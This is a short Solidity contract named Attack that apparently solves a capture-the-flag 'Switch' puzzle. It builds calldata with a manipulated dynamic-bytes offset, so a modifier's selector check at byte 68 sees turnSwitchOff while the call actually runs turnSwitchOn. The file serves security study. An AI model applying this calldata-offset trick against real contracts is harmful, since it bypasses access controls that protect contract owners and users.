//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISwitch {
    function flipSwitch(bytes memory _data) external;
    function turnSwitchOn() external;
    function turnSwitchOff() external;
}

contract Attack {
    constructor(address _switch) payable {
        bytes memory data = bytes.concat(
            ISwitch.flipSwitch.selector, // call flipSwitch
            abi.encode(68), // offset - 68 bytes to ignore, including this 32 bytes
            abi.encode(0), // an empty slot as a placeholder
            ISwitch.turnSwitchOff.selector, // the selector at 68th byte to pass `require` in the `onlyOff` modifier
            abi.encode(4), // offset points to here, length to read
            ISwitch.turnSwitchOn.selector // the selector to call
        );

        (bool s,) = _switch.call(data);
        require(s);
    }
}
